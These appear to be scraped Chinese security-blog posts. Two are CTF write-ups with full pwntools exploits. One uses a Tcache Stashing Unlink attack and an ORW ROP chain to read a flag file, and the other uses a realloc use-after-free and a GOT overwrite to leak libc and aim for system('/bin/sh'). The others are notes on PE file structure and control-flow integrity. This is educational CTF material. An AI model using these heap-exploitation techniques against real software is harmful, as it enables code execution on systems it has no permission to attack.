现在我们将 chunk2的 bk修改掉，fd不变 然后让fake_chunk的fd指向chunk2….. 12if ( __glibc_unlikely( bck-&gt;fd != victim ) ) malloc_printerr (\"malloc(): smallbin double linked list corrupted\"); 然后就可以把这个fake_chunk放到samll bin上了 12bin-&gt;bk = bck;bck-&gt;fd = bin; 有一说一，这个条件还挺苛刻的 0x02 Tcache Stashing Unlink Attack1.1 攻击目标 向任意指定位置写入指定值。 向任意地址分配一个Chunk。 1.2 攻击前提 能控制 Small Bin Chunk 的 bk 指针。 程序可以越过Tache取Chunk。(使用calloc即可做到) 程序至少可以分配两种不同大小且大小为unsorted bin的Chunk 1.3 攻击原理我们首先分析House of Lore Attack中所忽视的Tcache相关代码。 123456789101112131415161718192021222324252627282930313233#if USE_TCACHE //如果程序启用了Tcache /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ //遍历整个smallbin，获取相同size的free chunk size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ //判定Tcache的size链表是否已满，并且取出smallbin的末尾Chunk。 //验证取出的Chunk是否为Bin本身（Smallbin是否已空） while ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin) ) != bin) &#123; //如果成功获取了Chunk if (tc_victim != 0) &#123; // 获取 small bin 中倒数第二个 chunk 。 bck = tc_victim-&gt;bk; //设置标志位 set_inuse_bit_at_offset (tc_victim, nb); // 如果不是 main_arena，设置对应的标志 if (av != &amp;main_arena) set_non_main_arena (tc_victim); //取出最后一个Chunk bin-&gt;bk = bck; bck-&gt;fd = bin; //将其放入到Tcache中 tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif 其实发现一个很明显的地方，注意他把剩下的small_bin放入tcache的操作没有做任何的检查。 但是此处又有了矛盾的地方！ 首先，在引入Tcache后，Tcache中的Chunk拥有绝对优先权，我们不能越过Tcache向SmallBin中填入Chunk，也不能越过Tcache从SmallBin中取出Chunk。（除非Tcache已经处于FULL状态） 然后，我们如果要在这里启动攻击，那么要求SmallBin中至少有两个Chunk(否则无法进入While中的if语句块)，同时要求Tcache处于非空状态。 那样就产生了矛盾，导致这个漏洞看似无法利用。 但是calloc函数有一个很有趣的特性，它不会从Tcache拿Chunk，因此可以越过第一条矛盾“不能越过Tcache从SmallBin中取出Chunk”。 然后是Unsorted Bin的last remainder基址，当申请的Chunk大于Unsorted Bin中Chunk的大小且其为Unsorted Bin中的唯一Chunk时，该Chunk不会进入Tcache。 那么，再看这个图 12345678910 fd |-----------------------------------------| ↓ fd fd ||--------|---------&gt;|---------|---------&gt;|----------||smallbin| | chunk1 | | chunk2 | |--------|&lt;---------|---------|&lt;---------|----------| | bk bk ↑ | | |----------------------------------------| bk 如果我们把chunk1的bk改掉，fd不变 fd不变就可以绕过第一个完整链的检查,并且可以通过解链操作向fake_chunk+0x10的位置写入一个很大的值 1bck-&gt;fd = bin; 那么，当Tcache存在两个以上的空位时，程序会将我们的fake chunk置入Tcache。 0x03 例题 BUUOJ-2020 新春红包题-3123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113from pwn import *sh = process('./pwn')#context.log_level = 'debug'context.terminal = ['tmux', 'splitw', '-h']def add(idx, size_choice, content): sh.recvuntil('Your input: ') sh.sendline('1') sh.recvuntil('Please input the red packet idx: ') sh.sendline(str(idx)) sh.recvuntil('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ') sh.sendline(str(size_choice)) sh.recvuntil('Please input content: ') sh.send(content)def remove(idx): sh.recvuntil('Your input: ') sh.sendline('2') sh.recvuntil(': ') sh.sendline(str(idx))def edit(idx, content): sh.recvuntil('Your input: ') sh.sendline('3') sh.recvuntil(': ') sh.sendline(str(idx)) sh.recvuntil(': ') sh.send(content)def show(idx): sh.recvuntil('Your input: ') sh.sendline('4') sh.recvuntil(': ') sh.sendline(str(idx)) # 首先用calloc add delte同时操作，泄露出heap和libc基址for i in range(7): add(i, 4, 'a\\n') remove(i)show(6)heapbase = u64(sh.recvuntil('\\n')[:-1].ljust(8,'\\x00')) - 0x26c0log.success('heapbase: ' + hex(heapbase))# 在这里把对应大小(0x100)的tcache准备好（5个），虽然我这里写了6个，但其实要想任意地址分配的话是5个，不过我这里无所谓for i in range(7,13): add(i, 2, 'a\\n') remove(i)add(14, 4, 'a\\n')add(15, 1, 'b\\n')remove(14)show(14)libcbase = u64(sh.recvuntil('\\n')[:-1].ljust(8,'\\x00'))- 0x3ebca0log.success('libcbase: ' + hex(libcbase)) # 然后利用last_reminder的性质，如果malloc一个比它大的，就会把这个加入到smallbin种，构造出两个smallbinadd(15, 3, 'c\\n')remove(0)add(16, 3, 'a\\n')add(1, 3, 'a\\n')payload = p64(heapbase + 0x37e0) + p64(heapbase+0x250+0x10+0x800-0x10)edit(0,'a'*0x300+p64(0) +p64(0x101) +payload)pop_rdi_ret = libcbase + 0x000000000002155fpop_rdx_rsi_ret = libcbase + 0x00000000001306d9open_addr = libcbase + 0x10fc40read_addr = libcbase + 0x110070write_addr = libcbase + 0x110140leave_ret = libcbase + 0x0000000000054803flag_addr = heapbase+0x37f0payload = ''payload += './flag\\x00\\x00'payload += p64(pop_rdi_ret)payload += p64(flag_addr)payload += p64(pop_rdx_rsi_ret)payload += p64(0x20)payload += p64(0)payload += p64(open_addr)payload += p64(pop_rdi_ret)payload += p64(3)payload += p64(pop_rdx_rsi_ret)payload += p64(0x20)payload += p64(flag_addr)payload += p64(read_addr)payload += p64(pop_rdi_ret)payload += p64(1)payload += p64(pop_rdx_rsi_ret)payload += p64(0x20)payload += p64(flag_addr)payload += p64(write_addr)# 最后利用后门函数有个栈溢出，因为开了沙箱逃逸，因此orw即可add(2, 2, payload + '\\n')sh.recvuntil('input: ')sh.sendline('666')payload = 'a'*0x80 + p64(flag_addr) + p64(leave_ret)sh.recvuntil('What do you want to say?')#gdb.attach(sh)sh.send(payload)sh.interactive()","tags":[{"name":"tcache","slug":"tcache","permalink":"wood1314.github.io/tags/tcache/"}]},{"title":"pwnable.tw re-alloc","date":"2020-07-29T12:47:27.000Z","path":"year/07/29/cl6ewldah003gj63fskuq9kux/","text":"以前做过realloc相关的利用，不过这题让我学到了realloc利用的新姿势 题目描述题目提供了四个功能 12341. alloc2. realloc3. free4. exit 其中alloc功能相当于malloc一个指定大小的块，不过大小限定在了0x78以内，realloc功能就是使用realloc函数重新分配空间，如果成功返回了一个地址，那么就把这个地址复制到bss段上。这里存在一个off by null，如果这个题没有两个堆块这个数量限制的话还可以搞堆重叠，但是只有两个chunk的话就很难利用。 realloc功能为更改chunk的size以及更新content内容，这里末尾不会自动补0.值得注意的是，当size为0时，相当于触发free但是对应的bss上的数组中的指针不会清0，于是这里有一个uaf可以利用。 free功能就是同时free掉chunk以及将heap数组中的指针清0 相关知识点libc2.29 相关123456789101112typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;//glibc-2.29typedef struct tcache_entry&#123; struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key;&#125; tcache_entry; libc2.29中多出了一个结构叫做key，它会把tcache结构的头部保存在key中,然后在空闲chunk加入tcache链后从key开始遍历tcache中的chunk，看看有没有重复的，有则会出现double free的报错 检测代码如下 123456789101112if (__glibc_unlikely (e-&gt;key == tcache)) // 检查是否为tcache_perthread_struct地址 &#123; tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) // 检查tcache中是否有一样的chunk malloc_printerr (\"free(): double free detected in tcache 2\"); /* If we get here, it was a coincidence. We've wasted a few cycles, but don't abort. */ &#125; 简单总结一下，2.29下tcache触发double free报错的条件为： 1e-key == &amp;tcache_perthread_struct &amp;&amp; chunk in tcachebin[chunk_idx] realloc(ptr, size)函数总的来说，realloc函数在size不同的情况下，可以达到malloc，edit，free三种功能： ptr == 0: malloc(size) ptr != 0 &amp;&amp; size == 0: free(ptr) ptr != 0 &amp;&amp; size == old_size: edit(ptr) ptr != 0 &amp;&amp; size &lt; old_size: edit(ptr) and free(remainder) ptr != 0 &amp;&amp; size &gt; old_size: new_ptr = malloc(size); strcpy(new_ptr, ptr); free(ptr); return new_ptr; 利用思路 利用uaf在不同的tcache链上放置atoll_got的chunk 利用其中一个指向atoll_got的chunk，把atoll_got改为printf，利用格式化字符串漏洞泄露libc 最后再利用另一个指向atoll_got的chunk，将其改为system，最后调用system(‘/bin/sh’)拿到shell 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *context.log_level = 'debug'context.terminal = ['tmux', 'splitw', '-h']sh = process('./re-alloc')elf = ELF('./re-alloc')libc = ELF('./libc.so')def alloc(idx, size, content): sh.recvuntil('Your choice: ') sh.sendline('1') sh.recvuntil('Index:') sh.sendline(str(idx)) sh.recvuntil('Size:') sh.sendline(str(size)) sh.recvuntil('Data:') sh.send(content)def realloc(idx, size, content): sh.recvuntil('Your choice: ') sh.sendline('2') sh.recvuntil('Index:') sh.sendline(str(idx)) sh.recvuntil('Size:') sh.sendline(str(size)) if content == '': return else: sh.recvuntil('Data:') sh.send(content)def rfree(idx): sh.recvuntil('Your choice: ') sh.sendline('3') sh.recvuntil('Index:') sh.sendline(str(idx))bss = elf.bss(0)atoll_got = elf.got[\"atoll\"]atoll_plt = elf.plt[\"atoll\"]printf_plt = elf.plt[\"printf\"]libc_start_main_ret_offset = libc.symbols[\"__libc_start_main\"] + 0xebsystem_offset = libc.symbols[\"system\"]# let tcache[0x20] =&gt; atoll_got# heap[0] ==&gt; chunk(0x18) &lt;== heap[1]alloc(0, 0x18, 'aaa\\n') #mallocrealloc(0, 0, '') #freerealloc(0, 0x18, p64(atoll_got)) #editalloc(1, 0x18, \"BBB\") # now heap[0] == heap[1] == NULLrealloc(0, 0x38, 'aaa\\n')rfree(0)realloc(1, 0x38, \"D\" * 0x10)rfree(1)# let tcache[0x50] =&gt; atoll_got# heap[0] ==&gt; chunk(0x18) &lt;== heap[1]alloc(0, 0x48, \"AAAA\")realloc(0,0,'')realloc(0, 0x48, p64(atoll_got))alloc(1, 0x48, 'BBB')# now heap[0] == heap[1] == NULLrealloc(0, 0x58, \"CCC\")rfree(0)realloc(1, 0x58, \"D\" * 0x10)rfree(1)# above all, we get two tcache point to atoll_got that can be malloc# alloc once at heap[0]# change the atoll_got to printf_plt# use format string bug to leak the __libc_start_main_ret in the stackgdb.attach(sh,'b*0x40129D')alloc(0, 0x48, p64(printf_plt))sh.sendlineafter(\"Your choice: \", \"3\")sh.sendlineafter(\"Index:\", \"%21$p\")libc_start_main_ret = int(p.recv(14), 16)libc_base = libc_start_main_ret - libc_start_main_ret_offsetlibc_system = libc_base + system_offsetsh.interactive() 小结 被free掉的chunk再用realloc进行相同size的操作居然可以达到uaf的效果，本以为会malloc出来的 把atoll函数改为printf真的强，这也提供了一个思路就是可以通过一个漏洞来构造另外的漏洞来达成利用的目的","tags":[{"name":"tcache","slug":"tcache","permalink":"wood1314.github.io/tags/tcache/"},{"name":"pwnable","slug":"pwnable","permalink":"wood1314.github.io/tags/pwnable/"}]},{"title":"PE结构","date":"2020-07-08T13:26:31.000Z","path":"year/07/08/cl6ewld9e0013j63fcf5bs5xb/","text":"梳理下PE的文件结构 PE整体结构PE结构可以大致分为: DOS部分 NT头 节表(块表) 节数据(块数据) 调试信息 DOS头123456789101112131415161718192021typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number (标志,不会变的标志) WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; IMAGE_DOS_HEADER结构体的大小为64字节。在该结构中必须知道两个重要成员: e_magic与e_lfanew e_magic: DOS签名(signature) e_lfanew: 只是NT头的偏移 主要通过它里面的e_magic和e_lfanew来判断该文件是否是PE文件格式。 NT头PE文件头由PE文件头标志，标准PE头，扩展PE头三部分组成。PE文件头标志自然是50 40 00 00，也就是’PE’，我们从结构体的角度看一下PE文件头的详细信息 12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; //NT头标志 =&gt; 4字节 IMAGE_FILE_HEADER FileHeader; //文件头 =&gt; 20字节 IMAGE_OPTIONAL_HEADER32 OptionalHeader; //扩展PE头 =&gt; 32位下224字节(0xE0) 64位下240字节(0xF0)&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 文件头文件头是表现文件大致属性的IMAGE_FILE_HEADER结构体。 123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; //可以运行在什么平台上 任意:0 ,Intel 386以及后续:14C x64:8664 WORD NumberOfSections; //节的数量 DWORD TimeDateStamp; //编译器填写的时间戳 DWORD PointerToSymbolTable; //调试相关 DWORD NumberOfSymbols; //调试相关 WORD SizeOfOptionalHeader; //标识扩展PE头大小 WORD Characteristics; //文件属性 =&gt; 16进制转换为2进制根据哪些位有1,可以查看相关属性&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; 这个结构体主要包含了，CPU的Machine码，节区数量，需要装载的可选头的大小和文件属性等信息。 可选头可选头包含了很多信息，重点关注： 代码起始地址 AdressOfEntryPoint 加载基址 ImageBase。执行PE文件时，PE装载器先创建进程，再将文件载入内存，然后再把EIP寄存器的值设为ImgeBase+AddressOfEntryPoint 文件对齐和节区对齐的值 PE头的大小和Image的大小 IMAGE_DATA_DIRECTORY的表(包含了很多重要的表，例如导入表导出表等) 123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // WORD Magic; //PE32: 10B PE64: 20B BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; //所有含有代码的区块的大小 编译器填入 没用(可改) DWORD SizeOfInitializedData; //所有初始化数据区块的大小 编译器填入 没用(可改) DWORD SizeOfUninitializedData; //所有含未初始化数据区块的大小 编译器填入 没用(可改) DWORD AddressOfEntryPoint; //程序入口RVA DWORD BaseOfCode; //代码区块起始RVA DWORD BaseOfData; //数据区块起始RVA // // NT additional fields. // DWORD ImageBase; //内存镜像基址(程序默认载入基地址) DWORD SectionAlignment; //内存中对齐大小 DWORD FileAlignment; //文件中对齐大小(提高程序运行效率) WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; //内存中整个PE文件的映射的尺寸,可比实际值大,必须是SectionAlignment的整数倍 DWORD SizeOfHeaders; //所有的头加上节表文件对齐之后的值 DWORD CheckSum; //映像校验和,一些系统.dll文件有要求,判断是否被修改 WORD Subsystem; WORD DllCharacteristics; //文件特性,不是针对DLL文件的,16进制转换2进制可以根据属性对应的表格得到相应的属性 DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; //数据目录表,结构体数组&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 节区头节区头是由IMAGE_SECTION_HEADER结构体组成的数组，每个结构体对应一个节区。 123456789101112131415typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; //ASCII字符串 可自定义 只截取8个字节 union &#123; //该节在没有对齐之前的真实尺寸,该值可以不准确 DWORD PhysicalAddress; DWORD VirtualSize; &#125; Misc; DWORD VirtualAddress; //内存中的偏移地址 DWORD SizeOfRawData; //节在文件中对齐的尺寸 DWORD PointerToRawData; //节区在文件中的偏移 DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; //节的属性&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 主要包含了节区的偏移地址，对齐和节的属性等信息 导出表导出表(Export Table)一般是DLL文件用的比较多，exe文件很少有导出表，导出表的数据结构如下 12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; // 指针指向该导出表文件名字符串 DWORD Base; // 导出函数起始序号 DWORD NumberOfFunctions; // 所有导出函数的个数 DWORD NumberOfNames; // 以函数名字导出的函数个数 DWORD AddressOfFunctions; // 指针指向导出函数地址表RVA DWORD AddressOfNames; // 指针指向导出函数名称表RVA DWORD AddressOfNameOrdinals; // 指针指向导出函数序号表RVA&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 导入表123456789101112131415typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // RVA 指向 INT (PIMAGE_THUNK_DATA结构数组) &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real date\\time stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; //RVA指向dll名字,以0结尾 DWORD FirstThunk; // RVA 指向 IAT (PIMAGE_THUNK_DATA结构数组)&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; 可以看到，OriginalFirstThunk 和 FirstThunk 指向的内容分别是 INT 和 IAT ，但实际上 INT 和 IAT 的内容是一样的，所以他们指向的内容是一样的，只是方式不同而已，下图可以完美的解释 但是上图只是PE文件加载前的情况，PE文件一旦运行起来，就会变成下图的情况 PE-Viewer123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213// ConsoleApplication3.cpp : 定义控制台应用程序的入口点。//#include \"stdafx.h\"#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;stdlib.h&gt;DWORD RVAOffset(PIMAGE_NT_HEADERS pNtHeader, DWORD Rva) &#123; PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pNtHeader); for (int i = 0; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123; DWORD SectionBeginRva = pSectionHeader[i].VirtualAddress; DWORD SectionEndRva = pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData; if (Rva &gt;= SectionBeginRva &amp;&amp; Rva &lt;= SectionEndRva) &#123; DWORD Temp = Rva - SectionBeginRva; DWORD Rwa = Temp + pSectionHeader[i].PointerToRawData; return Rwa; &#125; &#125;&#125;int main(int argc, char* argv[])&#123; HANDLE hFile; HANDLE hMapping; WCHAR szFilePath[MAX_PATH]; LPVOID ImageBase; PIMAGE_DOS_HEADER pDH = NULL;//指向IMAGE_DOS结构的指针 PIMAGE_NT_HEADERS pNtH = NULL;//指向IMAGE_NT结构的指针 PIMAGE_FILE_HEADER pFH = NULL;//指向IMAGE_FILE结构的指针 PIMAGE_OPTIONAL_HEADER pOH = NULL;//指向IMAGE_OPTIONALE结构的指针 OPENFILENAME ofn;//定义结构，调用打开对话框选择要分析的文件及其保存路径 memset(szFilePath, 0, MAX_PATH); memset(&amp;ofn, 0, sizeof(ofn)); //打开一个窗口，选择文件 ofn.lStructSize = sizeof(ofn); ofn.hwndOwner = NULL; ofn.hInstance = GetModuleHandle(NULL); ofn.nMaxFile = MAX_PATH; ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY; ofn.lpstrInitialDir = L\".\"; ofn.lpstrFile = szFilePath; ofn.lpstrTitle = L\"chose a PE file --by w00d\"; ofn.lpstrFilter = L\"*.*\\0*.*\\0\"; if (!GetOpenFileName(&amp;ofn)) &#123; printf(\"打开文件错误:%d\\n\", GetLastError()); return 0; &#125; hFile = CreateFile(szFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0); if (!hFile) &#123; MessageBox(NULL, L\"打开文件错误\", NULL, MB_OK); return 0; &#125; hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL); if (!hMapping) &#123; printf(\"创建映射错误%d\", GetLastError()); CloseHandle(hFile); return 0; &#125; ImageBase = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0); if (!ImageBase) &#123; printf(\"文件映射错误:%d\", GetLastError()); CloseHandle(hMapping); CloseHandle(hFile); return 0; &#125; /************************************************************************/ /* PE头的判断 */ /************************************************************************/ printf(\"--------------------PEheader------------------------\\n\"); pDH = (PIMAGE_DOS_HEADER)ImageBase; if (pDH-&gt;e_magic != IMAGE_DOS_SIGNATURE) //判断是否是MZ &#123; printf(\"Not a valid PE file 2!\\n\"); CloseHandle(hMapping); CloseHandle(hFile); return 0; &#125; pNtH = (PIMAGE_NT_HEADERS)((DWORD)pDH + pDH-&gt;e_lfanew); //判断是否为PE格式 if (pNtH-&gt;Signature != IMAGE_NT_SIGNATURE) &#123; printf(\"Not a valid PE file 3!\\n\"); CloseHandle(hMapping); CloseHandle(hFile); return 0; &#125; printf(\"PE e_lfanew is: 0x%x\\n\", pNtH); /************************************************************************/ /* FileHeader */ /************************************************************************/ pFH = &amp;pNtH-&gt;FileHeader; printf(\"-----------------FileHeader------------------------\\n\"); printf(\"NumberOfSections: %d\\n\", pFH-&gt;NumberOfSections); printf(\"SizeOfOptionalHeader: %d\\n\", pFH-&gt;SizeOfOptionalHeader); /************************************************************************/ /* OptionalHeader */ /************************************************************************/ pOH = &amp;pNtH-&gt;OptionalHeader; printf(\"-----------------OptionalHeader---------------------\\n\"); printf(\"SizeOfCode:0x%08x\\n\", pOH-&gt;SizeOfCode); printf(\"AddressOfEntryPoint: 0x%08X\\n\", pOH-&gt;AddressOfEntryPoint); printf(\"ImageBase is 0x%x\\n\", ImageBase); printf(\"SectionAlignment: 0x%08x\\n\", pOH-&gt;SectionAlignment); printf(\"FileAlignment: 0x%08x\\n\", pOH-&gt;FileAlignment); printf(\"SizeOfImage: 0x%08x\\n\", pOH-&gt;SizeOfImage); printf(\"SizeOfHeaders: 0x%08x\\n\", pOH-&gt;SizeOfHeaders); printf(\"NumberOfRvaAndSizes: 0x%08x\\n\", pOH-&gt;NumberOfRvaAndSizes); /************************************************************************/ /* SectionTable */ /************************************************************************/ int SectionNumber = 0; DWORD SectionHeaderOffset = (DWORD)pNtH + 24 + (DWORD)pFH-&gt;SizeOfOptionalHeader; //节表位置的计算 printf(\"--------------------SectionTable---------------------\\n\"); for (SectionNumber; SectionNumber &lt; pFH-&gt;NumberOfSections; SectionNumber++) &#123; PIMAGE_SECTION_HEADER pSh = (PIMAGE_SECTION_HEADER)(SectionHeaderOffset + 40 * SectionNumber); printf(\"%d 's Name is %s\\n\", SectionNumber + 1, pSh-&gt;Name); printf(\"VirtualAddress: 0x%08X\\n\", (DWORD)pSh-&gt;VirtualAddress); printf(\"SizeOfRawData: 0x%08X\\n\", (DWORD)pSh-&gt;SizeOfRawData); printf(\"PointerToRawData: 0x%08X\\n\", (DWORD)pSh-&gt;PointerToRawData); &#125; /************************************************************************/ /* ExportTable */ /************************************************************************/ printf(\"--------------------ExportTable----------------------\\n\"); DWORD Export_table_offset = RVAOffset(pNtH, (DWORD)pNtH-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)ImageBase + Export_table_offset); DWORD EXport_table_offset_Name = (DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;Name); DWORD * pNameOfAddress = (DWORD *)((DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNames)); DWORD * pFunctionOfAdress = (DWORD *)((DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;AddressOfFunctions)); WORD * pNameOrdinalOfAddress = (WORD *)((DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNameOrdinals)); printf(\"Name:%s\\n\", EXport_table_offset_Name); printf(\"NameOfAddress:%08X\\n\", RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNames)); printf(\"FunctionOfAdress:%08X\\n\", RVAOffset(pNtH, pExportDirectory-&gt;AddressOfFunctions)); printf(\"NameOrdinalOfAddress:%08X\\n\", RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNameOrdinals)); if (pExportDirectory-&gt;NumberOfFunctions == 0) &#123; puts(\"!!!!!!!!!!!!!!!!!NO EXPORT!!!!!!!!!!!!!!!!!!!!!\"); if (hFile != INVALID_HANDLE_VALUE) &#123; CloseHandle(hFile); &#125; if (hMapping != NULL) &#123; CloseHandle(hMapping); &#125; if (ImageBase != NULL) &#123; UnmapViewOfFile(ImageBase); &#125; &#125; printf(\"NumberOfNames:%d\\n\", pExportDirectory-&gt;NumberOfNames); printf(\"NumberOfFunctions:%d\\n\", pExportDirectory-&gt;NumberOfFunctions); /************************************************************************/ /* ImportTable */ /************************************************************************/ printf(\"--------------------ImportTable----------------------\\n\"); int cont = 0; do &#123; DWORD dwImportOffset = RVAOffset(pNtH, pNtH-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); dwImportOffset = dwImportOffset + cont; PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)ImageBase + dwImportOffset); if (pImport-&gt;OriginalFirstThunk == 0 &amp;&amp; pImport-&gt;TimeDateStamp == 0 &amp;&amp; pImport-&gt;ForwarderChain == 0 &amp;&amp; pImport-&gt;Name == 0 &amp;&amp; pImport-&gt;FirstThunk == 0) break; DWORD dwOriginalFirstThunk = (DWORD)ImageBase + RVAOffset(pNtH, pImport-&gt;OriginalFirstThunk); DWORD dwFirstThunk = (DWORD)ImageBase + RVAOffset(pNtH, pImport-&gt;FirstThunk); DWORD dwName = (DWORD)ImageBase + RVAOffset(pNtH, pImport-&gt;Name); printf(\"---------Import File Name: %s\\n\", dwName); if (dwOriginalFirstThunk == 0x00000000) &#123; dwOriginalFirstThunk = dwFirstThunk; &#125; DWORD* pdwTrunkData = (DWORD*)dwOriginalFirstThunk; int n = 0, x = 0; while (pdwTrunkData[n] != 0) &#123; DWORD TrunkData = pdwTrunkData[n]; if (TrunkData &lt; IMAGE_ORDINAL_FLAG32)//名字导入 &#123; PIMAGE_IMPORT_BY_NAME pInportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)ImageBase + RVAOffset(pNtH, TrunkData)); printf(\"ImportByName: %s\\n\", pInportByName-&gt;Name); &#125; else &#123; DWORD FunNumber = (DWORD)(TrunkData - IMAGE_ORDINAL_FLAG32); printf(\"ImportByNumber: %-4d \\n\", FunNumber); &#125; if (x != 0 &amp;&amp; x % 3 == 0) printf(\"\\n\"); n++; x++; &#125; cont = cont + 40;//其实这里的40不是太理解，这个导入表不应该只有一个么，为什么是个循环 &#125; while (1); &#123; if (ImageBase) &#123; UnmapViewOfFile(ImageBase); &#125; if (hMapping) &#123; CloseHandle(hMapping); &#125; if (hFile != INVALID_HANDLE_VALUE) &#123; CloseHandle(hFile); &#125; return 0; &#125; return 0;&#125;","tags":[{"name":"逆向","slug":"逆向","permalink":"wood1314.github.io/tags/逆向/"}]},{"title":"CFI与影子堆栈","date":"2020-06-28T04:03:29.000Z","path":"year/06/28/cl6ewld8o000dj63f6yd9rdgz/","text":"最近读论文碰到了CFI和影子堆栈相关，记录一下，添加一些自己的感想。 参考https://blog.csdn.net/zko1021/article/details/85250383 http://readm.tech/2016/11/09/cet-shadow_stacks/ 本文讨论的原理基于Control-Flow Integrity Principles, Implementations, and Applications这篇论文。 1 回顾为什么需要CFI1.1 劫持控制流 攻击者能够通过控制流劫持来获取目标机器的控制权，甚至进行提权操作，对目标机器进行全面控制。 早期的攻击通常采用代码注入的方式，通过上载一段代码，将控制转向这段代码执行。 代码重用攻击使得硬件支持下的DEP保护机制仍能被绕过。 1.2 早期防范措施 堆栈金丝雀[Cowan et al. 1998]，运行时消除缓冲区溢出[Ruwase and Lam 2004]等。 局限性：缓解范围有限，性能损失高，依赖于硬件修改等。 What we need：高可靠性，易于理解，强制执行，可部署性，低开销。 